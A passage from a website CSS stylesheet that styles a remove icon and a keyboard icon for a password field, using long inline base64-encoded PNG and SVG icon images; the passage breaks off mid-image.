    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB0AAAAbCAYAAACAyoQSAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAbtJREFUeNqslstxgzAQhoEK3EFcAh3EdKCcczBccvVQAXYFxNdcTA45B1dgOggdBHdACdmdLBlQdvUAdkYjBoQ+rfbflcLA096qjy1029Gr/iV9bn3mCB1BO+j20BS0jTCshnaFBVSLoACLoSuh7Twc6aCdTPDQADxCVwTzDT3PAN47QQF4gS4NlhvGOtHBkeDhGkA0DM9NfxkxgimCdS0mR0RPS8PPFW0XZ7h9r9RzVlCqTaHwUtF2cIaCyDA+DLinuOX0XQRznu4lDwf5kyDG4AHY0nfsn4R5FAdVwuBJMRiB6zFQEw87D2nmN2WoCHyZ4knba6tcqPqLYQgWjWPEecNYSrm7BCjnqQVcCkDlCHzwhWIs34VvjSGdxnb3gfaCaAJB1U7b2/oCByV6grs/KP0gDT4zQBTNTRcXzZMboI2+vVK8DpRSnEonqobnjaGUNrCobnK00Q/fQvoMWxcLKsWKdYL2aSml1b/zdIWDOzB4mbB5itXCVYGeqZbbioPppJhjmS7EaGnOWTxEYO1UBmllCR3MS+5G1ax7LxWBg+Ho02Fn2903dF06pZSi2/2jBrqTQp1C8iPAAA7cvoztbcobAAAAAElFTkSuQmCC);
    /*background-image:url(Remove.svg);*/
    background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjwhLS0gR2VuZXJhdG9yOiBBZG9iZSBJbGx1c3RyYXRvciAxNS4xLjAsIFNWRyBFeHBvcnQgUGx1Zy1JbiAuIFNWRyBWZXJzaW9uOiA2LjAwIEJ1aWxkIDApICAtLT4NCjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+DQo8c3ZnIHZlcnNpb249IjEuMSINCgkgaWQ9InN2ZzMwMTMiIGlua3NjYXBlOnZlcnNpb249IjAuNDguMy4xIHI5ODg2IiBzb2RpcG9kaTpkb2NuYW1lPSJyZW1vdmVfc2lnbl9mb250X2F3ZXNvbWUuc3ZnIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iIHhtbG5zOnN2Zz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOmNjPSJodHRwOi8vY3JlYXRpdmVjb21tb25zLm9yZy9ucyMiIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyIgeG1sbnM6c29kaXBvZGk9Imh0dHA6Ly9zb2RpcG9kaS5zb3VyY2Vmb3JnZS5uZXQvRFREL3NvZGlwb2RpLTAuZHRkIiB4bWxuczppbmtzY2FwZT0iaHR0cDovL3d3dy5pbmtzY2FwZS5vcmcvbmFtZXNwYWNlcy9pbmtzY2FwZSINCgkgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgeD0iMHB4IiB5PSIwcHgiIHdpZHRoPSIyOC41NzFweCINCgkgaGVpZ2h0PSIyNi45MDFweCIgdmlld0JveD0iMC41MjggLTI1NC4xOTggMjguNTcxIDI2LjkwMSIgZW5hYmxlLWJhY2tncm91bmQ9Im5ldyAwLjUyOCAtMjU0LjE5OCAyOC41NzEgMjYuOTAxIg0KCSB4bWw6c3BhY2U9InByZXNlcnZlIj4NCjxzb2RpcG9kaTpuYW1lZHZpZXcgIGlkPSJuYW1lZHZpZXczMDE5IiBpbmtzY2FwZTpjdXJyZW50LWxheWVyPSJzdmczMDEzIiBpbmtzY2FwZTp3aW5kb3cteT0iMjUiIGlua3NjYXBlOndpbmRvdy14PSIwIiBpbmtzY2FwZTp3aW5kb3ctaGVpZ2h0PSI0ODAiIGlua3NjYXBlOndpbmRvdy13aWR0aD0iNjQwIiBpbmtzY2FwZTpwYWdlc2hhZG93PSIyIiBpbmtzY2FwZTpwYWdlb3BhY2l0eT0iMCIgaW5rc2NhcGU6em9vbT0iMC4xMzE2OTY0MyIgYm9yZGVyb3BhY2l0eT0iMSIgc2hvd2dyaWQ9ImZhbHNlIiBib3JkZXJjb2xvcj0iIzY2NjY2NiIgZ3VpZGV0b2xlcmFuY2U9IjEwIiBvYmplY3R0b2xlcmFuY2U9IjEwIiBwYWdlY29sb3I9IiNmZmZmZmYiIGdyaWR0b2xlcmFuY2U9IjEwIiBpbmtzY2FwZTpjeD0iODk2IiBpbmtzY2FwZTpjeT0iODk2IiBpbmtzY2FwZTp3aW5kb3ctbWF4aW1pemVkPSIwIj4NCgk8L3NvZGlwb2RpOm5hbWVkdmlldz4NCjxnIGlkPSJnMzAxNSIgdHJhbnNmb3JtPSJtYXRyaXgoMSwwLDAsLTEsMTM2LjY3Nzk3LDEyOTMuMDE2OSkiPg0KCTxwYXRoIGlkPSJwYXRoMzAxNyIgaW5rc2NhcGU6Y29ubmVjdG9yLWN1cnZhdHVyZT0iMCIgZmlsbD0iIzlBQTBBNSIgZD0iTS0xMTUuMTU1LDE1MzAuMDE1YzAsMC4yOS0wLjEwNSwwLjU0Mi0wLjMxOCwwLjc1Mw0KCQlsLTMuMDI5LDMuMDNsMy4wMjksMy4wM2MwLjIxMywwLjIxMiwwLjMxOCwwLjQ2MywwLjMxOCwwLjc1M2MwLDAuMzAxLTAuMTA1LDAuNTU4LTAuMzE4LDAuNzdsLTEuNTA2LDEuNTA3DQoJCWMtMC4yMTMsMC4yMTItMC40NjksMC4zMTgtMC43NzEsMC4zMThjLTAuMjksMC0wLjU0MS0wLjEwNi0wLjc1My0wLjMxOGwtMy4wMy0zLjAzbC0zLjAzLDMuMDMNCgkJYy0wLjIxMiwwLjIxMi0wLjQ2MywwLjMxOC0wLjc1MywwLjMxOGMtMC4zMDEsMC0wLjU1OC0wLjEwNi0wLjc3LTAuMzE4bC0xLjUwNy0xLjUwN2MtMC4yMTItMC4yMTItMC4zMTgtMC40NjktMC4zMTgtMC43Nw0KCQljMC0wLjI5LDAuMTA2LTAuNTQxLDAuMzE4LTAuNzUzbDMuMDMtMy4wM2wtMy4wMy0zLjAzYy0wLjIxMi0wLjIxMi0wLjMxOC0wLjQ2My0wLjMxOC0wLjc1M2MwLTAuMzAxLDAuMTA2LTAuNTU4LDAuMzE4LTAuNzcNCgkJbDEuNTA3LTEuNTA3YzAuMjEyLTAuMjEyLDAuNDY5LTAuMzE4LDAuNzctMC4zMThjMC4yOSwwLDAuNTQyLDAuMTA2LDAuNzUzLDAuMzE4bDMuMDMsMy4wM2wzLjAzLTMuMDMNCgkJYzAuMjEyLTAuMjEyLDAuNDYzLTAuMzE4LDAuNzUzLTAuMzE4YzAuMzAyLDAsMC41NTgsMC4xMDYsMC43NzEsMC4zMThsMS41MDYsMS41MDcNCgkJQy0xMTUuMjYsMTUyOS40NTctMTE1LjE1NSwxNTI5LjcxNC0xMTUuMTU1LDE1MzAuMDE1eiBNLTEwOC42NzYsMTUzMy43OTljMC0yLjMzMy0wLjU3NC00LjQ4NC0xLjcyNC02LjQ1NA0KCQljLTEuMTQ5LTEuOTctMi43MS0zLjUzLTQuNjc5LTQuNjc5Yy0xLjk3MS0xLjE1LTQuMTIxLTEuNzI1LTYuNDU0LTEuNzI1cy00LjQ4NCwwLjU3NS02LjQ1NCwxLjcyNQ0KCQljLTEuOTcsMS4xNDktMy41MjksMi43MDktNC42NzksNC42NzljLTEuMTUsMS45Ny0xLjcyNSw0LjEyMS0xLjcyNSw2LjQ1NHMwLjU3NSw0LjQ4NCwxLjcyNSw2LjQ1NA0KCQljMS4xNDksMS45NywyLjcwOSwzLjUyOSw0LjY3OSw0LjY3OWMxLjk3LDEuMTQ5LDQuMTIxLDEuNzI0LDYuNDU0LDEuNzI0czQuNDgzLTAuNTc1LDYuNDU0LTEuNzI0DQoJCWMxLjk2OS0xLjE1LDMuNTI5LTIuNzA5LDQuNjc5LTQuNjc5Uy0xMDguNjc2LDE1MzYuMTMyLTEwOC42NzYsMTUzMy43OTl6Ii8+DQo8L2c+DQo8L3N2Zz4NCg==);
    background-size:contain;
    background-repeat:no-repeat;
}

/************************************************************************
* open keyboard icon in passworf field  - 26.8.2014
************************************************************************/  

a.openkeyboard.inInput:after{
    content:" ";
    width: 24px;
    height: 16px;
    background-repeat:no-repeat;
    background-color:#fff;
    background-image: url(data:image/png;base64,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);
    background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjwhLS0gR2VuZXJhdG9yOiBBZG9iZSBJbGx1c3RyYXRvciAxNS4xLjAsIFNWRyBFeHBvcnQgUGx1Zy1JbiAuIFNWRyBWZXJzaW9uOiA2LjAwIEJ1aWxkIDApICAtLT4NCjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+DQo8c3ZnIHZlcnNpb249IjEuMSIgaWQ9IkViZW5lXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4Ig0KCSB3aWR0aD0iMTYyLjYyN3B4IiBoZWlnaHQ9IjI3LjEyNXB4IiB2aWV3Qm94PSIwIDAgMTYyLjYyNyAyNy4xMjUiIGVuYWJsZS1iYWNrZ3JvdW5kPSJuZXcgMCAwIDE2Mi42MjcgMjcuMTI1Ig0KCSB4bWw6c3BhY2U9InByZXNlcnZlIj4NCjxwYXRoIGZpbGw9IiNDQ0Q3RTEiIGQ9Ik0xNy4yMzcsMTcuMTc2Yy0yLjI5NS0wLjk3NC0yLjgzOS0xLjMxMy0yLjgzOS0xLjMxM2wtMC4wMjEtMi4yNGMwLDAsMC44Ni0wLjY3MywxLjEyNy0yLjc4Mg0KCWMwLjUzNywwLjE1OSwxLjEwMy0wLjgxNiwxLjEzMy0xLjMzYzAuMDI5LTAuNDk1LTAuMDc0LTEuODY4LTAuNzMtMS43M2MwLjEzNC0xLjAzNCwwLjIzMS0xLjk2NCwwLjE4NC0yLjQ1Ng0KCWMtMC4xNzEtMS44MDEtMS45MTEtMy42OTktNC41ODktMy42OTljLTIuNjc4LDAtNC40MjEsMS44OTctNC41OTIsMy42OThDNi44NjMsNS44MTYsNi45NjEsNi43NDYsNy4wOTUsNy43OA0KCWMtMC42NTYtMC4xMzgtMC43NiwxLjIzNS0wLjczLDEuNzNjMC4wMzEsMC41MTQsMC41OTQsMS40ODksMS4xMzMsMS4zM2MwLjI2NywyLjEwOSwxLjEyNywyLjc4MiwxLjEyNywyLjc4MmwtMC4wMjEsMi4yNDENCgljMCwwLTAuNTQ1LDAuMzM4LTIuODM5LDEuMzEyYy0yLjI5NiwwLjk3NC00LjYxNCwxLjY1NC01LjMwNCwyLjc1Yy0wLjYxOSwwLjk4MS0wLjQzNCw1LjY5OS0wLjQzNCw1LjY5OWgyMi45NDgNCgljMCwwLDAuMTg2LTQuNzE4LTAuNDM0LTUuNjk5QzIxLjg1MSwxOC44MywxOS41MzIsMTguMTQ4LDE3LjIzNywxNy4xNzZ6Ii8+DQo8Zz4NCgk8cGF0aCBmaWxsPSJub25lIiBkPSJNNDMuMjUsMTUuNWMtMS4zNDgsMC0yLjQzOCwxLjAwOC0yLjQzOCwyLjI1YzAsMC44MzIsMC40OTIsMS41NTksMS4yMiwxLjk0N3YyLjU1M2gyLjQzN3YtMi41NTMNCgkJYzAuNzI5LTAuMzkxLDEuMjE5LTEuMTE1LDEuMjE5LTEuOTQ3QzQ1LjY4OCwxNi41MDgsNDQuNTk2LDE1LjUsNDMuMjUsMTUuNXoiLz4NCgk8cGF0aCBmaWxsPSIjQ0NEN0UxIiBkPSJNMzYuNzUsNy42MjV2M2gzLjI0OXYtM2MwLjAwMy0wLjc3MiwwLjMxMy0xLjUzMiwwLjk1Mi0yLjEyMWMwLjY0LTAuNTg5LDEuNDYxLTAuODc3LDIuMjk5LTAuODc5DQoJCWMwLjgzNiwwLjAwMiwxLjY1OSwwLjI5LDIuMjk5LDAuODc5YzAuNjM3LDAuNTg5LDAuOTQ4LDEuMzQ5LDAuOTUxLDIuMTIxdjNoMy4yNDl2LTNjMC4wMDItMS41My0wLjYzOC0zLjA3NS0xLjkwMy00LjI0Mg0KCQljLTEuMjY1LTEuMTY5LTIuOTM4LTEuNzYxLTQuNTk2LTEuNzU4Yy0xLjY1OS0wLjAwMy0zLjMzMiwwLjU4OS00LjU5OCwxLjc1OEMzNy4zODcsNC41NSwzNi43NDcsNi4wOTUsMzYuNzUsNy42MjV6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTUyLjk5OSwyNC4xMjV2LTEwLjVjMC0wLjM4NC0wLjE1OC0wLjc2OC0wLjQ3Ni0xLjA2MXMtMC43MzItMC40MzktMS4xNDgtMC40MzlIMzUuMTI0DQoJCWMtMC40MTYsMC0wLjgzMSwwLjE0Ni0xLjE0OSwwLjQzOWMtMC4zMTUsMC4yOTMtMC40NzUsMC42NzctMC40NzUsMS4wNjF2MTAuNWMwLDAuMzg0LDAuMTU4LDAuNzY4LDAuNDc1LDEuMDYxDQoJCWMwLjMxOCwwLjI5MywwLjczMywwLjQzOSwxLjE0OSwwLjQzOWgxNi4yNTFjMC40MTYsMCwwLjgzMS0wLjE0NiwxLjE0OC0wLjQzOVM1Mi45OTksMjQuNTA5LDUyLjk5OSwyNC4xMjV6IE00NC40NjgsMTkuNjk3djIuNTUzDQoJCWgtMi40Mzd2LTIuNTUzYy0wLjcyOS0wLjM5MS0xLjIyMS0xLjExNS0xLjIyMS0xLjk0N2MwLTEuMjQyLDEuMDkyLTIuMjUsMi40MzgtMi4yNXMyLjQzNywxLjAwOCwyLjQzNywyLjI1DQoJCUM0NS42ODgsMTguNTgyLDQ1LjE5NSwxOS4zMDksNDQuNDY4LDE5LjY5N3oiLz4NCjwvZz4NCjxwYXRoIGZpbGw9IiNDQzAwMDAiIGQ9Ik0xNjIuNDk2LDI2LjE1OWwtNy44MTctMTMuNjM3Yy0wLjMwMy0wLjUzLTAuODAxLTAuNTMtMS4xMDUsMGwtNy44MTgsMTMuNjM3DQoJYy0wLjMwMywwLjUzLTAuMDUsMC45NjYsMC41NjMsMC45NjZoMTUuNjE5QzE2Mi41NSwyNy4xMjUsMTYyLjgwNCwyNi42ODksMTYyLjQ5NiwyNi4xNTkgTTE1My40MzEsMTYuMDU3aDEuMzk0DQoJYzAuNDIsMCwwLjQ3OSwwLjI0MywwLjQ3OSwwLjM4OWwtMC4wMDQsMC4xMjdsLTAuMDEsMC4xNDZsLTAuMjg2LDUuMDljLTAuMDQyLDAuMzgxLTAuMjExLDAuNDU3LTAuNDkxLDAuNDU3aC0wLjc0Mg0KCWMtMC4yODEsMC0wLjQ1My0wLjA3Ni0wLjQ5NC0wLjQ2N2wtMC4yODUtNS4wOGwtMC4wMTItMC4xNDZsLTAuMDA0LTAuMTI3QzE1Mi45NzYsMTYuMywxNTMuMDM1LDE2LjA1NywxNTMuNDMxLDE2LjA1Nw0KCSBNMTU0LjE0NiwyNS44MzdjLTAuNzMxLDAtMS4zMjYtMC41ODktMS4zMjYtMS4zMTJjMC0wLjc0MiwwLjU4Mi0xLjMyMywxLjMyNi0xLjMyM2MwLjcyNywwLDEuMzE1LDAuNTk0LDEuMzE1LDEuMzIzDQoJQzE1NS40NjIsMjUuMjM0LDE1NC44NTgsMjUuODM3LDE1NC4xNDYsMjUuODM3Ii8+DQo8cGF0aCBmaWxsPSIjMDA0OTdCIiBkPSJNNzQuNjg2LDIuMTQyYy02LjM0OCwwLTExLjQ5LDUuMTQyLTExLjQ5LDExLjQ5YzAsNi4zNDcsNS4xNDQsMTEuNDg5LDExLjQ5LDExLjQ4OQ0KCWM2LjM0NiwwLDExLjQ4OS01LjE0MywxMS40ODktMTEuNDg5Qzg2LjE3NSw3LjI4NCw4MS4wMzEsMi4xNDIsNzQuNjg2LDIuMTQyeiBNNzcuNDk1LDIwLjc3bC0wLjExNiwwLjA0NQ0KCWMtMC42ODgsMC4yNzEtMS4yMzQsMC40NzgtMS42NDYsMC42MTljLTAuNDMzLDAuMTUtMC45MzcsMC4yMjgtMS40OTgsMC4yMjhjLTAuODgzLDAtMS41ODgtMC4yMjQtMi4wOS0wLjY2Ng0KCWMtMC41MTMtMC40NTEtMC43NzEtMS4wMjktMC43NzEtMS43MjJjMC0wLjI1MiwwLjAxOC0wLjUxLDAuMDU1LTAuNzcyYzAuMDM1LTAuMjU4LDAuMDkyLTAuNTQ5LDAuMTctMC44NzdsMC44NTYtMy4wMzMNCgljMC4wNzMtMC4yOCwwLjEzNy0wLjU1MSwwLjE4OC0wLjgwNmMwLjA0OS0wLjI0MiwwLjA3Mi0wLjQ2NiwwLjA3Mi0wLjY2YzAtMC4zMTItMC4wNTYtMC41My0wLjE2Mi0wLjYzNA0KCWMtMC4wNjQtMC4wNi0wLjI0NC0wLjE2LTAuNzQ4LTAuMTZjLTAuMTk3LDAtMC4zOTgsMC4wMzEtMC42MTEsMC4wOTRjLTAuMjI3LDAuMDY2LTAuNDIsMC4xMzEtMC41OCwwLjE5bC0wLjQzLDAuMTZsMC4zNjUtMS40OTYNCglsMC4xMTUtMC4wNDZjMC41NTQtMC4yMjYsMS4xMDItMC40MjUsMS42MjQtMC41OTFjMS41MTUtMC40NzksMi44MzYtMC4yNzEsMy41ODgsMC40MDFjMC40OTksMC40NDUsMC43NTIsMS4wMjcsMC43NTIsMS43MjkNCgljMCwwLjEzNi0wLjAxOSwwLjM3NC0wLjA0NywwLjcxN2MtMC4wMzMsMC4zNDItMC4wOTUsMC42NjQtMC4xODMsMC45NThsLTAuODUxLDMuMDFjLTAuMDY5LDAuMjM2LTAuMTI5LDAuNTA0LTAuMTgzLDAuODA1DQoJYy0wLjA1MSwwLjI5My0wLjA3NywwLjUxMi0wLjA3NywwLjY2MmMwLDAuMzE2LDAuMDYyLDAuNTM1LDAuMTc5LDAuNjMxYzAuMDkyLDAuMDc0LDAuMzAxLDAuMTYyLDAuNzc3LDAuMTYyDQoJYzAuMTg2LDAsMC4zOTgtMC4wMzMsMC42MzgtMC4xYzAuMjQ0LTAuMDY2LDAuNDIxLTAuMTI1LDAuNTI4LTAuMTc4bDAuNDYzLTAuMjIxTDc3LjQ5NSwyMC43N3ogTTc3LjMwNSw4LjUzMQ0KCWMtMC40MzgsMC40MS0wLjk3OSwwLjYxOS0xLjYsMC42MTljLTAuNjE5LDAtMS4xNTktMC4yMDgtMS42MDQtMC42MTljLTAuNDQ5LTAuNDE1LTAuNjc5LTAuOTI2LTAuNjc5LTEuNTE4DQoJYzAtMC41OTIsMC4yMjgtMS4xMDQsMC42NzctMS41MjRjMC44OTMtMC44MjksMi4zMjEtMC44MjgsMy4yMDUsMGMwLjQ0NiwwLjQxOSwwLjY3NCwwLjkzMSwwLjY3NCwxLjUyMw0KCUM3Ny45NzksNy42MDUsNzcuNzUyLDguMTE2LDc3LjMwNSw4LjUzMXoiLz4NCjxwYXRoIGZpbGw9IiNDQ0Q3RTEiIGQ9Ik05NS40MDMsMTMuNzgyYy0zLjEzMiwwLTUuNjcxLDIuNTM4LTUuNjcxLDUuNjcyYzAsMy4xMzUsMi41MzksNS42NzMsNS42NzEsNS42NzMNCgljMy4xMzQsMCw1LjY3My0yLjUzOCw1LjY3My01LjY3M0MxMDEuMDc2LDE2LjMyLDk4LjUzNywxMy43ODIsOTUuNDAzLDEzLjc4MnogTTk1LjYxNywyMi43NjVjLTAuMTg3LDAuMTc3LTAuNDAzLDAuMjY1LTAuNjUyLDAuMjY1DQoJYy0wLjI1MywwLTAuNDcyLTAuMDg4LTAuNjU3LTAuMjY1Yy0wLjE4Ni0wLjE3Ni0wLjI3OS0wLjM4OC0wLjI3OS0wLjYzM2MwLTAuMjQ2LDAuMDk0LTAuNDU5LDAuMjc5LTAuNjM4DQoJYzAuMTg2LTAuMTgsMC40MDQtMC4yNywwLjY1Ny0wLjI3YzAuMjQ5LDAsMC40NjYsMC4wOSwwLjY1MiwwLjI3YzAuMTg3LDAuMTc5LDAuMjc5LDAuMzkyLDAuMjc5LDAuNjM4DQoJQzk1Ljg5NiwyMi4zNzcsOTUuODA0LDIyLjU4OSw5NS42MTcsMjIuNzY1eiBNOTYuOTczLDE5LjQzOWMtMC40NDYsMC40MDQtMS4wNDEsMC42MzUtMS43ODUsMC42OTNsLTAuMDI4LDAuNjZoLTAuNDMydi0xLjg4Nw0KCWMwLjQ2OC0wLjAzOSwwLjgzNS0wLjE4NywxLjEwMS0wLjQ0NGMwLjI2Ni0wLjI1NywwLjM5OC0wLjYwNiwwLjM5OC0xLjA1MWMwLTAuMzUyLTAuMDk0LTAuNjM0LTAuMjc5LTAuODQ1DQoJYy0wLjE4Ni0wLjIxMy0wLjQzNi0wLjMxOC0wLjc1LTAuMzE4Yy0wLjEzMywwLTAuMjUsMC4wMTQtMC4zNTQsMC4wNDFjLTAuMTAzLDAuMDI3LTAuMjAzLDAuMDctMC4zLDAuMTI4DQoJYzAuMDMxLDAuMTA0LDAuMDcsMC4yMzcsMC4xMTMsMC40MDFjMC4wNDQsMC4xNjMsMC4wNjYsMC4zMTMsMC4wNjYsMC40NTNjMCwwLjIyNi0wLjA3NCwwLjQwMS0wLjIyMSwwLjUyNg0KCWMtMC4xNDcsMC4xMjQtMC4zNTMsMC4xODctMC42MTQsMC4xODdjLTAuMjQ1LDAtMC40MzgtMC4wNzctMC41OC0wLjIzM2MtMC4xNDEtMC4xNTUtMC4yMTEtMC4zNDYtMC4yMTEtMC41NzINCgljMC0wLjM3MSwwLjIxMi0wLjY4NywwLjYzNi0wLjk0NXMwLjkzNi0wLjM4OCwxLjUzMy0wLjM4OGMwLjcwOSwwLDEuMjgxLDAuMTg0LDEuNzIsMC41NTNjMC40MzgsMC4zNjksMC42NTcsMC44NTQsMC42NTcsMS40Ng0KCUM5Ny42NDMsMTguNTA4LDk3LjQxOSwxOS4wMzYsOTYuOTczLDE5LjQzOXoiLz4NCjxnPg0KCTxwYXRoIGZpbGw9IiNDQ0Q3RTEiIGQ9Ik0xMTAuMTY3LDE2LjIwMmgtMC44OTRjLTAuMjQ2LDAtMC40NDYsMC4yMDEtMC40NDYsMC40NDd2MC44OTVjMCwwLjI0NiwwLjIsMC40NDcsMC40NDYsMC40NDdoMC44OTQNCgkJYzAuMjQ2LDAsMC40NDgtMC4yMDEsMC40NDgtMC40NDd2LTAuODk1QzExMC42MTUsMTYuNDAzLDExMC40MTMsMTYuMjAyLDExMC4xNjcsMTYuMjAyeiIvPg0KCTxwYXRoIGZpbGw9IiNDQ0Q3RTEiIGQ9Ik0xMTEuODA3LDE3Ljk5MWgwLjg5NGMwLjI0NywwLDAuNDQ3LTAuMjAxLDAuNDQ3LTAuNDQ3di0wLjg5NWMwLTAuMjQ2LTAuMi0wLjQ0Ny0wLjQ0Ny0wLjQ0N2gtMC44OTQNCgkJYy0wLjI0NiwwLTAuNDQ3LDAuMjAxLTAuNDQ3LDAuNDQ3djAuODk1QzExMS4zNTksMTcuNzksMTExLjU2MSwxNy45OTEsMTExLjgwNywxNy45OTF6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTExNC4zNCwxNy45OTFoMC44OTRjMC4yNDYsMCwwLjQ0OC0wLjIwMSwwLjQ0OC0wLjQ0N3YtMC44OTVjMC0wLjI0Ni0wLjIwMi0wLjQ0Ny0wLjQ0OC0wLjQ0N2gtMC44OTQNCgkJYy0wLjI0NiwwLTAuNDQ3LDAuMjAxLTAuNDQ3LDAuNDQ3djAuODk1QzExMy44OTMsMTcuNzksMTE0LjA5NCwxNy45OTEsMTE0LjM0LDE3Ljk5MXoiLz4NCgk8cGF0aCBmaWxsPSIjQ0NEN0UxIiBkPSJNMTE3Ljc2NywxNi4yMDJoLTAuODk0Yy0wLjI0NiwwLTAuNDQ3LDAuMjAxLTAuNDQ3LDAuNDQ3djAuODk1YzAsMC4yNDYsMC4yMDEsMC40NDcsMC40NDcsMC40NDdoMC44OTQNCgkJYzAuMjQ2LDAsMC40NDctMC4yMDEsMC40NDctMC40NDd2LTAuODk1QzExOC4yMTQsMTYuNDAzLDExOC4wMTMsMTYuMjAyLDExNy43NjcsMTYuMjAyeiIvPg0KCTxwYXRoIGZpbGw9IiNDQ0Q3RTEiIGQ9Ik0xMjAuMzAxLDE2LjIwMmgtMC44OTVjLTAuMjQ2LDAtMC40NDcsMC4yMDEtMC40NDcsMC40NDd2MC44OTVjMCwwLjI0NiwwLjIwMSwwLjQ0NywwLjQ0NywwLjQ0N2gwLjg5NQ0KCQljMC4yNDYsMCwwLjQ0Ni0wLjIwMSwwLjQ0Ni0wLjQ0N3YtMC44OTVDMTIwLjc0NywxNi40MDMsMTIwLjU0NywxNi4yMDIsMTIwLjMwMSwxNi4yMDJ6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTEyMi44MzMsMTYuMjAyaC0wLjg5NWMtMC4yNDYsMC0wLjQ0NiwwLjIwMS0wLjQ0NiwwLjQ0N3YwLjg5NWMwLDAuMjQ2LDAuMiwwLjQ0NywwLjQ0NiwwLjQ0N2gwLjg5NQ0KCQljMC4yNDYsMCwwLjQ0Ny0wLjIwMSwwLjQ0Ny0wLjQ0N3YtMC44OTVDMTIzLjI4LDE2LjQwMywxMjMuMDc5